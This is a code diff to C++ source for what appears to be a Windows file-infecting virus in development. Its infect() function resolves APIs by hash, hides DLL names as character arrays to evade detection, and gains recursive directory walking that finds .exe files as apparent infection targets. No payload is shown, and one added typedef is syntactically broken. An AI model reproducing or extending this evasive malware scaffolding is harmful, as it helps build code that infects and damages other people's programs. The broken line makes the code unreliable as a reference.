@@ -57,6 +57,7 @@ typedef void * (* mallocHeader)(std::size_t);
 typedef void * (* reallocHeader)(void *, std::size_t);
 typedef void (* freeHeader)(void *);
 typedef char * (* strncatHeader)(char *, const char *, std::size_t);
+typedef int (* strnicmpHeader(const char *, const char *, std::size_t);
 typedef std::size_t (* strlenHeader)(const char *);
 typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
 typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
@@ -73,7 +74,7 @@ std::uint32_t fnv321a(const char *string)
    while (*string != 0)
    {
       hashval ^= *string++;
-      hashval *= 0x01000193;
+      hashval *= 0x1000193;
    }
 
    return hashval;
@@ -144,6 +145,7 @@ int infect(void)
    reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
    freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
    strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
+   strnicmpHeader strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
    strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
    memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
    char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
@@ -171,16 +173,22 @@ int infect(void)
 
    while (search_stack_size > 0)
    {
-      char *search_visit = search_stack[--search_stack_size];
+      char *search_visit = search_stack[0];
       char starSearch[] = {'\\','*',0};
+      char exeSearch[] = {'.','e','x','e',0};
+      --search_stack_size;
 
+      /* pop the search off the stack */
       if (search_stack_size == 0)
       {
          free(search_stack);
          search_stack = nullptr;
       }
       else
+      {
+         memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
          search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
+      }
 
       char *search_string = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(starSearch)+1));
       memcpy(search_string, search_visit, strlen(search_visit)+1);
@@ -198,8 +206,27 @@ int infect(void)
       {
          std::wcout << "\t" << find_data.cFileName << std::endl;
          if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10)
-            std::wcout << "\t\tIs a directory " << std::hex << find_data.dwFileAttributes << std::endl;
-         
+         {
+            char slash[] = {'\\',0};
+            char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
+            memcpy(new_directory, search_visit, strlen(search_visit)+1);
+            strncat(new_directory, slash, strlen(slash));
+            strncat(new_directory, find_data.cFileName, strlen(find_data.cFileName));
+
+            ++search_stack_size;
+            
+            if (search_stack == nullptr)
+               search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
+            else
+               search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
+            
+            search_stack[search_stack_size-1] = new_directory;
+            std::wcout << "\t\tIs a directory" << std::endl;
+         }
+         else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
+         {
+            std::wcout << "\t\tIs an executable" << std::endl;
+         }
       } while (findNextFile(find_handle, &find_data));
 
       std::wcout << std::endl;
